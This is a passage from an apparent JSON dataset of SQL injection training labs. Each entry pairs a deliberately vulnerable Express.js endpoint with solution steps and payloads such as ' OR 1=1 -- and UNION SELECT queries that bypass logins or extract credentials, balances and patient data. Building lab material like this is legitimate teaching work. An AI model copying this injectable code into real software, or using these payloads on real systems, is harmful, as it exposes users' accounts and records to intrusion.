    "Lab Description": "The IoT dashboard is vulnerable to SQL Injection in the device firmware upload feature. An attacker can inject SQL payloads into the device ID field, potentially compromising multiple devices or extracting firmware data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the firmware upload request and identify the vulnerable device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to manipulate the firmware upload process and compromise other devices.",
      "Use UNION SELECT to extract device firmware data from the database.",
      "Verify successful exploitation by viewing or altering device firmware settings."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/upload-firmware', (req, res) => {\n  const { deviceId, firmware } = req.body;\n  const sql = `UPDATE devices SET firmware = '${firmware}' WHERE device_id = '${deviceId}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error uploading firmware');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, firmware FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Statements",
    "Lab Description": "The banking portal allows users to view their account statements. However, due to improper input sanitization, an attacker can inject SQL payloads into the account number field to access other users' statements and perform unauthorized operations.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to capture the account statement request and identify the vulnerable account number parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to retrieve account statements from unauthorized accounts.",
      "Use UNION SELECT to extract account transaction details and balances.",
      "Verify successful retrieval of unauthorized account statements and transaction data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-statement', (req, res) => {\n  const { accountNumber } = req.query;\n  const sql = `SELECT * FROM statements WHERE account_number = '${accountNumber}'`;\n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve statement');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, transaction_date, amount FROM statements --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in User Authentication",
    "Lab Description": "The API gateway in a web application is vulnerable to SQL Injection in the user authentication process. An attacker can bypass the login process by injecting SQL payloads into the username or password fields, allowing access to the system.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and identify the vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication and gain unauthorized access.",
      "Use UNION SELECT to retrieve user information or escalate privileges.",
      "Verify successful login with injected credentials."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Search Function",
    "Lab Description": "A CMS has a search functionality that allows users to search for posts by title. The search query parameter is not properly sanitized, allowing attackers to inject SQL queries and retrieve sensitive information or manipulate results.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture the search request using Burp Suite and identify the vulnerable query parameter.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract sensitive data.",
      "Use time-based or boolean-based SQL injection to infer additional data from the database.",
      "Verify successful data extraction or manipulation of search results."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM posts WHERE title LIKE '%${query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Transaction History",
    "Lab Description": "The transaction history page in the banking portal is vulnerable to SQL Injection. An attacker can inject SQL payloads into the transaction ID field, allowing them to view transactions of other users or manipulate transaction data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the request with Burp Suite and identify the vulnerable transaction ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to view other users' transactions.",
      "Use UNION SELECT to extract sensitive transaction details, such as amounts and timestamps.",
      "Verify successful data manipulation or unauthorized access to transactions."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const { transactionId } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transactionId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving transaction history');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, amount, date FROM transactions --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Control Panel",
    "Lab Description": "The IoT dashboard allows users to control their connected devices. However, the device control panel is vulnerable to SQL Injection. An attacker can inject SQL queries into device ID fields, potentially controlling or compromising IoT devices.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the device control request and identify the vulnerable device ID parameter.",
      "Inject SQL payloads like ' OR 1=1 -- to control other devices or gain unauthorized access to device settings.",
      "Use UNION SELECT to extract sensitive device data such as firmware versions or configurations.",
      "Verify successful exploitation by manipulating the device's state or extracting sensitive data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/control-device', (req, res) => {\n  const { deviceId, action } = req.body;\n  const sql = `UPDATE devices SET state = '${action}' WHERE device_id = '${deviceId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error controlling device');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, state FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Transfer Logs",
    "Lab Description": "The banking portal stores logs of account transfer activities, which are displayed to administrators. Due to insufficient input sanitization, attackers can inject SQL payloads into the transaction ID or user ID fields to manipulate logs and hide unauthorized transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture the transfer log request and identify the vulnerable transaction ID and user ID parameters.",
      "Inject SQL payloads like ' OR 1=1 -- to manipulate the logs and erase unauthorized transactions.",
      "Use UNION SELECT to alter transaction log entries, such as account numbers and amounts.",
      "Verify successful log manipulation or unauthorized log deletions."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transfer-logs', (req, res) => {\n  const { transactionId, userId } = req.query;\n  const sql = `SELECT * FROM transfer_logs WHERE transaction_id = '${transactionId}' AND user_id = '${userId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to retrieve transfer logs');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, user_id, amount FROM transfer_logs --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "CMS - SQL Injection in Comment Section",
    "Lab Description": "The CMS has a comment section where users can leave feedback. However, the system fails to sanitize user input, allowing attackers to inject SQL queries into the comment field. This can lead to the exposure of sensitive data or system manipulation.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the comment submission request using Burp Suite to identify the vulnerable comment field.",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract user credentials.",
      "Use boolean-based SQL injection to retrieve hidden data, such as comment counts or internal admin information.",
      "Verify successful data extraction or system manipulation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/comment', (req, res) => {\n  const { comment } = req.body;\n  const sql = `INSERT INTO comments (comment) VALUES ('${comment}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Account Login",
    "Lab Description": "The banking portal's account login functionality is vulnerable to SQL Injection. An attacker can inject SQL payloads into the username or password fields, allowing unauthorized access to user accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request using Burp Suite to identify the vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication.",
      "Use UNION SELECT to extract sensitive account information, such as balance and transaction history.",
      "Verify successful login or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM accounts WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a --"
    ]
  },
  {
    "Lab scenario": "API Gateway - SQL Injection in Product Search",
    "Lab Description": "The product search feature of an e-commerce platform's API gateway is vulnerable to SQL Injection. Attackers can inject SQL payloads into the search parameter to retrieve product data or access sensitive information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a search query request and identify the vulnerable search parameter.",
      "Inject SQL payloads like ' UNION SELECT product_id, product_name, price FROM products -- to extract product data.",
      "Use time-based or boolean-based SQL injection to infer additional product details or customer information.",
      "Verify successful data retrieval."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM products WHERE name LIKE '%${query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, product_name, price FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Fund Transfer",
    "Lab Description": "The banking portal's fund transfer page is vulnerable to SQL Injection. An attacker can inject SQL queries into the transfer form, allowing unauthorized transactions or the leakage of account balances.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the transfer request using Burp Suite to identify the vulnerable parameters (account number, amount).",
      "Inject SQL payloads like ' UNION SELECT account_id, balance FROM accounts -- to extract balance details.",
      "Use UNION SELECT to modify transfer amounts or redirect funds to another account.",
      "Verify successful transaction manipulation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const { fromAccount, toAccount, amount } = req.body;\n  const sql = `UPDATE accounts SET balance = balance - ${amount} WHERE account_id = '${fromAccount}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transfer failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT account_id, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard - SQL Injection in Device Settings",
    "Lab Description": "The IoT dashboard has a device settings page that is vulnerable to SQL Injection. An attacker can inject SQL payloads into device parameters, allowing them to manipulate device configurations or access sensitive device data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the device settings request using Burp Suite to identify the vulnerable parameters (device ID, setting).",
      "Inject SQL payloads like ' UNION SELECT device_id, device_name, firmware_version FROM devices -- to extract sensitive data.",
      "Use boolean-based SQL injection to determine device configurations or exploit vulnerabilities in firmware.",
      "Verify successful configuration manipulation or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-settings', (req, res) => {\n  const { deviceId, setting } = req.body;\n  const sql = `UPDATE devices SET setting = '${setting}' WHERE device_id = '${deviceId}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update device setting');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, device_name, firmware_version FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-commerce Platform - SQL Injection in Login Page",
    "Lab Description": "The login page of the e-commerce platform is vulnerable to SQL Injection. Attackers can inject SQL payloads into the username or password fields to bypass authentication and gain unauthorized access to accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request using Burp Suite to identify the vulnerable parameters (username, password).",
      "Inject basic SQL payloads like ' OR 1=1 -- to bypass the login.",
      "Verify the login bypass by accessing the user account without valid credentials.",
      "Extract account information if needed."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Login failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a --"
    ]
  },
  {
    "Lab scenario": "API - SQL Injection in Search Endpoint",
    "Lab Description": "An API endpoint used for searching products is vulnerable to SQL Injection. Attackers can inject SQL payloads into the search parameter to retrieve unauthorized product data or manipulate the search results.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a search request and identify the vulnerable search parameter.",
      "Inject SQL payloads like ' UNION SELECT product_id, name, price FROM products -- to extract product information.",
      "Verify successful data retrieval or manipulation.",
      "Exploit any identified data for further system access if necessary."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { query } = req.query;\n  const sql = `SELECT * FROM products WHERE name LIKE '%${query}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_id, name, price FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Banking Portal - SQL Injection in Balance Check",
    "Lab Description": "The banking portal has a balance check feature that is vulnerable to SQL Injection. An attacker can inject SQL payloads into the balance check request to retrieve sensitive information like account balances and transaction history.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the balance check request using Burp Suite to identify the vulnerable parameter (account number).",
      "Inject SQL payloads like ' UNION SELECT account_id, balance FROM accounts -- to extract account balances.",
      "Use time-based SQL injection to confirm successful data retrieval.",
      "Verify the successful extraction of sensitive account data."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/balance', (req, res) => {\n  const { account_id } = req.query;\n  const sql = `SELECT * FROM accounts WHERE account_id = '${account_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Balance check failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_id, balance FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Admin Panel - SQL Injection in User Management",
    "Lab Description": "The admin panel of a web application is vulnerable to SQL Injection. The vulnerability exists in the user management section, where the admin can update or delete users. An attacker could manipulate the user data or delete users using SQL injection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the user management request using Burp Suite to identify the vulnerable parameters (user ID, action).",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to extract user data.",
      "Use UNION SELECT to modify or delete users from the database.",
      "Verify the system compromise by checking the user management functionality after exploitation."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/admin/users', (req, res) => {\n  const { user_id, action } = req.body;\n  const sql = `UPDATE users SET action = '${action}' WHERE user_id = '${user_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Action failed');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "IoT Device - SQL Injection in Device Configuration",
    "Lab Description": "The IoT device configuration page is vulnerable to SQL Injection. Attackers can inject SQL payloads into configuration settings, allowing them to alter device configurations or retrieve sensitive data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture the device configuration request using Burp Suite to identify vulnerable parameters (device_id, config_type).",
      "Inject SQL payloads like ' UNION SELECT device_id, config_value FROM devices -- to extract configuration data.",
      "Use UNION SELECT to modify the device's configuration or alter firmware.",
      "Verify the success of configuration manipulation or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/device-config', (req, res) => {\n  const { device_id, config_type } = req.body;\n  const sql = `UPDATE devices SET config_type = '${config_type}' WHERE device_id = '${device_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to update configuration');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT device_id, config_value FROM devices --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Content Management System - SQL Injection in Article Comments",
    "Lab Description": "The article comment section of a CMS is vulnerable to SQL Injection. Attackers can inject SQL payloads into the comment submission form, potentially extracting sensitive user information or altering articles.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the comment submission request using Burp Suite to identify the vulnerable comment field.",
      "Inject SQL payloads like ' UNION SELECT username, email FROM users -- to extract user data.",
      "Use Boolean-based SQL injection to infer hidden data or article content.",
      "Verify successful data extraction or modification of articles."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-comment', (req, res) => {\n  const { comment } = req.body;\n  const sql = `INSERT INTO comments (comment) VALUES ('${comment}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Cloud Storage - SQL Injection in File Search",
    "Lab Description": "A cloud storage application’s file search feature is vulnerable to SQL Injection. Attackers can inject SQL payloads to retrieve file metadata or sensitive information, potentially leading to unauthorized access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the file search request using Burp Suite to identify vulnerable parameters (file_name).",
      "Inject SQL payloads like ' UNION SELECT file_id, file_name, file_size FROM files -- to extract file metadata.",
      "Use Boolean-based SQL injection to confirm the presence of sensitive files.",
      "Verify successful data retrieval or unauthorized access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search-file', (req, res) => {\n  const { file_name } = req.query;\n  const sql = `SELECT * FROM files WHERE file_name LIKE '%${file_name}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Search failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT file_id, file_name, file_size FROM files --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Financial Portal - SQL Injection in Transaction History",
    "Lab Description": "The financial portal's transaction history page is vulnerable to SQL Injection. Attackers can inject SQL payloads into the transaction ID field to retrieve sensitive transaction information or manipulate transaction records.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the transaction history request using Burp Suite to identify vulnerable parameters (transaction_id).",
      "Inject SQL payloads like ' UNION SELECT transaction_id, amount, date FROM transactions -- to extract transaction details.",
      "Use UNION SELECT to modify transaction records or redirect funds.",
      "Verify the success of transaction manipulation or data extraction."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/transaction-history', (req, res) => {\n  const { transaction_id } = req.query;\n  const sql = `SELECT * FROM transactions WHERE transaction_id = '${transaction_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Transaction history failed');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT transaction_id, amount, date FROM transactions --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Admin Dashboard - SQL Injection in User Deletion",
    "Lab Description": "The admin dashboard allows admin users to delete accounts but is vulnerable to SQL Injection. An attacker could exploit this vulnerability to delete or alter user data from the database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the user deletion request using Burp Suite to identify vulnerable parameters (user_id).",
      "Inject SQL payloads like ' UNION SELECT username, password FROM users -- to retrieve user data.",
      "Use UNION SELECT to modify or delete user records.",
      "Verify successful data deletion or modification in the admin dashboard."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/admin/delete-user', (req, res) => {\n  const { user_id } = req.body;\n  const sql = `DELETE FROM users WHERE user_id = '${user_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to delete user');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, password FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Healthcare Portal - SQL Injection in Patient Records",
    "Lab Description": "The healthcare portal contains a vulnerable patient record page where an attacker can inject SQL payloads into the patient ID field to retrieve sensitive medical information, such as patient details and diagnoses.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the patient records request using Burp Suite to identify vulnerable parameters (patient_id).",
      "Inject SQL payloads like ' UNION SELECT patient_name, diagnosis, treatment FROM patient_records -- to extract medical data.",
      "Use Boolean-based SQL injection to confirm the presence of sensitive patient information.",
      "Verify successful extraction of patient data from the records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/patient-record', (req, res) => {\n  const { patient_id } = req.query;\n  const sql = `SELECT * FROM patient_records WHERE patient_id = '${patient_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving patient record');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT patient_name, diagnosis, treatment FROM patient_records --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Social Media Platform - SQL Injection in User Profile",
    "Lab Description": "A social media platform's user profile page is vulnerable to SQL Injection. An attacker can inject SQL payloads into the profile update form, enabling them to extract sensitive user data or modify profile details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the profile update request using Burp Suite to identify vulnerable parameters (user_id, profile_data).",
      "Inject SQL payloads like ' UNION SELECT username, email, date_of_birth FROM users -- to extract user details.",
      "Use UNION SELECT to modify user profile information.",
      "Verify successful profile data extraction or modification."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-profile', (req, res) => {\n  const { user_id, profile_data } = req.body;\n  const sql = `UPDATE users SET profile_data = '${profile_data}' WHERE user_id = '${user_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error updating profile');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email, date_of_birth FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Travel Booking Portal - SQL Injection in Booking Details",
    "Lab Description": "The travel booking portal has a booking details page that is vulnerable to SQL Injection. Attackers can inject SQL payloads into the booking reference field to retrieve confidential booking information such as payment details and travel itinerary.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the booking details request using Burp Suite to identify vulnerable parameters (booking_reference).",
      "Inject SQL payloads like ' UNION SELECT booking_id, payment_status, travel_date FROM bookings -- to extract booking details.",
      "Use time-based SQL injection to confirm the presence of sensitive data in the system.",
      "Verify successful extraction of payment and travel details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/booking-details', (req, res) => {\n  const { booking_reference } = req.query;\n  const sql = `SELECT * FROM bookings WHERE booking_reference = '${booking_reference}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving booking details');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT booking_id, payment_status, travel_date FROM bookings --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Inventory Management System - SQL Injection in Item Lookup",
    "Lab Description": "The inventory management system's item lookup page is vulnerable to SQL Injection. An attacker can inject SQL payloads into the item ID field to retrieve item details or manipulate the inventory database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the item lookup request using Burp Suite to identify vulnerable parameters (item_id).",
      "Inject SQL payloads like ' UNION SELECT item_name, price, quantity FROM inventory -- to extract item details.",
      "Use UNION SELECT to modify inventory records or alter stock quantities.",
      "Verify successful data retrieval or modification of inventory records."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/item-lookup', (req, res) => {\n  const { item_id } = req.query;\n  const sql = `SELECT * FROM inventory WHERE item_id = '${item_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving item');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT item_name, price, quantity FROM inventory --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Forum - SQL Injection in Post Comments",
    "Lab Description": "The online forum has a comment section where users can post comments. This section is vulnerable to SQL Injection. Attackers can inject SQL payloads into the comment submission form to extract user information or modify posts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the comment submission request using Burp Suite to identify the vulnerable parameter (comment).",
      "Inject SQL payloads like ' UNION SELECT username, email FROM users -- to extract user data.",
      "Use UNION SELECT to modify or delete forum posts.",
      "Verify successful data extraction or post modification."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/submit-comment', (req, res) => {\n  const { comment } = req.body;\n  const sql = `INSERT INTO comments (comment) VALUES ('${comment}')`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Failed to submit comment');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT username, email FROM users --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Job Portal - SQL Injection in Job Application",
    "Lab Description": "The job portal is vulnerable to SQL Injection in the job application form. Attackers can inject SQL payloads into the applicant ID field to retrieve sensitive job application data or modify existing records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the job application request using Burp Suite to identify vulnerable parameters (applicant_id).",
      "Inject SQL payloads like ' UNION SELECT applicant_name, job_title, application_status FROM applications -- to extract application details.",
      "Use UNION SELECT to modify job application statuses or change applicant data.",
      "Verify successful data retrieval or modification of job applications."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/job-application', (req, res) => {\n  const { applicant_id } = req.body;\n  const sql = `UPDATE applications SET status = 'approved' WHERE applicant_id = '${applicant_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error updating application');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT applicant_name, job_title, application_status FROM applications --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Store - SQL Injection in Product Price Update",
    "Lab Description": "The online store has a feature to update product prices, but the input field is vulnerable to SQL Injection. Attackers can inject SQL payloads into the price update request to change product prices or extract pricing data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the price update request using Burp Suite to identify vulnerable parameters (product_id, price).",
      "Inject SQL payloads like ' UNION SELECT product_name, price, category FROM products -- to extract product data.",
      "Use UNION SELECT to modify product prices or insert new products.",
      "Verify successful price modification or data retrieval."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/update-price', (req, res) => {\n  const { product_id, price } = req.body;\n  const sql = `UPDATE products SET price = '${price}' WHERE product_id = '${product_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error updating price');\n    else res.json({ success: true });\n  });\n});",
    "payloads": [
      "' UNION SELECT product_name, price, category FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Banking - SQL Injection in Account Balance",
    "Lab Description": "The online banking application is vulnerable to SQL Injection. An attacker can inject malicious SQL payloads into the account balance query to retrieve sensitive financial data or perform unauthorized transactions.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the account balance request using Burp Suite to identify vulnerable parameters (account_id).",
      "Inject SQL payloads like ' UNION SELECT account_number, balance, last_transaction FROM accounts -- to extract financial details.",
      "Use time-based SQL injection to confirm the presence of sensitive data.",
      "Verify successful extraction of account balance and transaction details."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/account-balance', (req, res) => {\n  const { account_id } = req.query;\n  const sql = `SELECT * FROM accounts WHERE account_id = '${account_id}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error retrieving account balance');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT account_number, balance, last_transaction FROM accounts --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "E-Commerce Site - SQL Injection in Product Search",
    "Lab Description": "The e-commerce site's product search functionality is vulnerable to SQL Injection. An attacker can inject SQL payloads into the search query to extract product details, including prices and descriptions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept the product search request using Burp Suite to identify vulnerable parameters (search_term).",
      "Inject SQL payloads like ' UNION SELECT product_name, price, description FROM products -- to extract product data.",
      "Use UNION SELECT to retrieve multiple products' details.",
      "Verify successful retrieval of product data from the database."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const { search_term } = req.query;\n  const sql = `SELECT * FROM products WHERE product_name LIKE '%${search_term}%'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error searching for products');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' UNION SELECT product_name, price, description FROM products --",
      "' OR 1=1 --"
    ]
  },
  {
    "Lab scenario": "Online Forum - SQL Injection in User Login",
    "Lab Description": "The online forum's user login form is vulnerable to SQL Injection. An attacker can inject SQL payloads into the login credentials to bypass authentication and gain access to user accounts.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept the login request using Burp Suite to identify vulnerable parameters (username, password).",
      "Inject SQL payloads like ' OR 1=1 -- to bypass authentication.",
      "Test various payloads to successfully log in as any user.",
      "Verify successful login with unauthorized access."
    ],
    "Vulnerability name": "SQL Injection",
    "srcCode": "app.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`; \n  db.query(sql, (err, result) => {\n    if (err) res.status(500).send('Error logging in');\n    else res.json(result);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' OR 'a'='a' --"
    ]
  },
  {
    "Lab scenario": "Real Estate Portal - SQL Injection in Property Listings",
